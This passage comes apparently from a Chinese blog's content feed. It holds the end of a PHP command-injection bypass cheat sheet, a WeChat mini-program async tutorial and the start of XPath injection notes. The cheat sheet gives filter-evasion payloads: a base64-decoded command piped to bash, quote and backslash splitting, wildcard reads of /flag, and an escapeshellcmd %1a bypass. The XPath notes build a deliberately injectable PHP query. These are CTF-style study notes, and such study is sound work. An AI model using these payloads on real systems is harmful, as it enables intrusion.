flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>

base64编码
linux@Extrader:/var/www/html$ <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token variable">`</span></span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>

单引号、双引号
linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /flag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">""</span>ag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">''</span>ag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>

反斜线 <span class="token punctuation">\</span>
linux@Extrader:/var/www/html$ ca<span class="token punctuation">\</span>t /fl<span class="token punctuation">\</span>ag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre>

<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><pre class="language-bash" data-language="bash"><code class="language-bash">linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flag   <span class="token comment"># 连接文件并打印到标准输出设备上</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">rev</span> /flag   <span class="token comment"># 将文件内容以字符为单位反序输出</span>
<span class="token punctuation">&#125;</span>e32de3e34-g45t4d2-45gt532-34f32e3<span class="token punctuation">&#123;</span>galf
linux@Extrader:/var/www/html$ <span class="token function">more</span> /flag  <span class="token comment"># 显示文件内容，每次显示一屏</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">tail</span> /flag  <span class="token comment"># 在屏幕上显示指定文件的末尾若干行</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">less</span> /flag  <span class="token comment"># 分屏上下翻页浏览文件内容</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">head</span> /flag  <span class="token comment"># 在屏幕上显示指定文件的开头若干行</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">tac</span> /flag   <span class="token comment"># 将文件以行为单位的反序输出</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">sort</span> /flag  <span class="token comment"># 将文件进行排序并输出</span>
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">nl</span> /flag    <span class="token comment"># 在Linux系统中计算文件内容行号</span>
     <span class="token number">1</span>  flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ hexdump /flag  <span class="token comment">#显示文件十六进制格式</span>
0000000 6c66 <span class="token number">6761</span> 337b <span class="token number">3265</span> <span class="token number">6633</span> <span class="token number">3334</span> 322d <span class="token number">3533</span>
0000010 <span class="token number">6774</span> <span class="token number">3435</span> 322d <span class="token number">3464</span> <span class="token number">3574</span> <span class="token number">6734</span> 342d <span class="token number">6533</span>
0000020 <span class="token number">6533</span> <span class="token number">3264</span> <span class="token number">6533</span> 0a7d
0000028
linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fl*
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fla?
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre>

<h2 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a>绕过escapeshellcmd</h2><p>测试代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dir '</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$escaped_command</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">,</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>执行<code>.bat</code>文件的时候，利用<code>%1a</code>，可以绕过过滤执行命令。</p>
<p>payload</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">dir</span><span class="token operator">=</span>. %1a <span class="token function">whoami</span></code></pre>

<h2 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a>${}执行代码</h2><pre class="language-bash" data-language="bash"><code class="language-bash">php <span class="token operator">></span> <span class="token variable">$&#123;system('whoami')&#125;</span><span class="token punctuation">;</span>
extrader<span class="token punctuation">\</span>extrader</code></pre>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.leavesongs.com/content/files/slides/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf">来自小密圈里的那些奇技淫巧</a></li>
<li><a href="https://www.mi1k7ea.com/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="https://www.freebuf.com/articles/web/154453.html">挖洞经验|命令注入突破长度限制</a></li>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序有关异步问题的一些操作</title>
    <url>/posts/80b70afe/</url>
    <content><![CDATA[<p>方法不唯一，后续有新方法再补上~</p>
<span id="more"></span>

<h3 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
	<span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// success</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// failure</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>关于<code>promise</code>  具体可参考阮老师的<a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></p>
<p>或者直接</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
    xxx
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>



<h3 id="同步化异步函数"><a href="#同步化异步函数" class="headerlink" title="同步化异步函数"></a>同步化异步函数</h3><p>app.js</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span>
<span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">success</span><span class="token operator">:</span> resolve<span class="token punctuation">,</span> <span class="token literal-property property">fail</span><span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">request</span><span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token literal-property property">getUserInfo</span><span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    xxx
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">globalData</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p>index.js使用</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token literal-property property">y</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p>
<h3 id="wx-request请求封装"><a href="#wx-request请求封装" class="headerlink" title="wx.request请求封装"></a>wx.request请求封装</h3><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p><code>api/index.js</code>封装</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token punctuation">,</span>
      <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">header</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token punctuation">,</span>
      <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">header</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  getdata<span class="token punctuation">,</span>
  postdata
<span class="token punctuation">&#125;</span></code></pre>

<p><code>app.js</code>引入</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index
<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    xxx
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">globalData</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    api
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p><code>index.js</code>使用</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api
<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token literal-property property">y</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p><code>app.js</code>引入</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">success</span><span class="token operator">:</span> resolve<span class="token punctuation">,</span> <span class="token literal-property property">fail</span><span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">request</span><span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p><code>index.js</code>使用</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></li>
<li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">微信小程序封装异步请求</a></li>
<li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">将小程序原生异步函数promisify后，在async/await中使用</a></li>
<li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">微信小程序中使用Async/Await方法异步请求变为同步请求</a></li>
</ul>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE学习笔记</title>
    <url>/posts/55c267c8/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><p>XPath注入对象是一个存储数据的XML文件</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>index.xml</strong></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p><strong>index.php</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
